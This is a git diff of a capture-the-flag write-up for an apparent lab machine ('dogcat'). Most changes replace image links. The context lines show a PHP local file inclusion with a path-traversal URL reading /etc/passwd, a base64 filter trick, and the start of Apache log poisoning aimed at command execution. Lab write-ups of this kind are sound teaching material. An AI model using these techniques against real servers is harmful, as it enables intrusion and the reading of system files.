@@ -24,11 +24,11 @@ Nmap done: 1 IP address (1 host up) scanned in 10.44 seconds
 ```
 
 Taking a look at the website:
-![grafik](https://github.com/Aryt3/writeups/assets/110562298/ff507e1b-0774-493c-afde-22b90ff5068b)
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/d66af131-6357-40b7-b082-53b3366ba83b)
 
-Solarized dark             |  Solarized Ocean
+`/dog`             |  `/cat`
 :-------------------------:|:-------------------------:
-![grafik](https://github.com/Aryt3/writeups/assets/110562298/2c0abc24-cfa2-4f35-8713-fa79277eae50)  |  ![grafik](https://github.com/Aryt3/writeups/assets/110562298/d269deaf-e0e7-4165-a1da-4cc7ae7cf2bc)
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/2fa69c9b-4d51-4abd-b64d-0c822e784fc2) |  ![grafik](https://github.com/Aryt3/writeups/assets/110562298/cc8e50a6-a4ad-484d-bc60-7be6e41f6aeb)
 
 There seems to be nothing of interest except the URL `http://10.10.219.26/?view=dog`. <br/>
 LFI doesn't seem to work, we can't access `/etc/passwd` nor `/etc/shadow`. <br/>
@@ -36,10 +36,10 @@ But knowing PHP a bit I know some other things to try out. <br/>
 
 First of all we should keep in mind that the url of the images is the following `/dogs/6.jpg`. <br/>
 This is important if we want to escape from there. Trying something out like `http://10.10.219.26/?view=dog/../index` doesn't seem to get us far, as we only get the following reply: <br/>
-![grafik](https://github.com/Aryt3/writeups/assets/110562298/847762ee-53d7-4e73-b32f-98ecde99252e)
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/f94e2ada-eb1c-4e2e-af6f-65ee545a213d)
 
 In some cases we can go around this by using a base64 filter function in php. <br/>
-![grafik](https://github.com/Aryt3/writeups/assets/110562298/9ae57f92-813a-4d3c-b32b-2b845b9255a6)
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/4afbc44c-d283-4052-bd73-711e130fe549)
 
 Seems like this worked as we got the following string back: <br/>
 ```
@@ -101,7 +101,7 @@ http://10.10.219.26/?view=?dog/../../../../etc/passwd&ext=
 ```
 
 Using this URL we get the actual output we want. <br/>
-![grafik](https://github.com/Aryt3/writeups/assets/110562298/ac0376cc-0380-46e6-8407-50c07e2182bb)
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/de8f6b7d-f858-4b7a-bb6d-42b50401b54d)
 ```
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -123,7 +123,7 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/no
 ```
 
 After poking around a bit I also found the file `/var/log/apache2/access.log`. <br/>
-![grafik](https://github.com/Aryt3/writeups/assets/110562298/44f84c81-be23-492c-9630-e99f08b17379)
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/db3b8602-752e-46b9-8271-6f2db17e95ca)
 
 Looking at the access logs we can see that the user agent is logged additionally without being URL encoded. <br/>
 Now this may be used to upload malicious content. <br/>
@@ -141,7 +141,7 @@ Connection: close
 ```
 
 Viewing the logs: <br/>
-![grafik](https://github.com/Aryt3/writeups/assets/110562298/1339543d-0012-46db-8316-d8cf527820d0)
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/ab035cac-46bf-4d3d-90a7-f818d9300e82)
 
 After knowing that it works I sent another request to implement a way to execute commands. <br/>
 ```sh
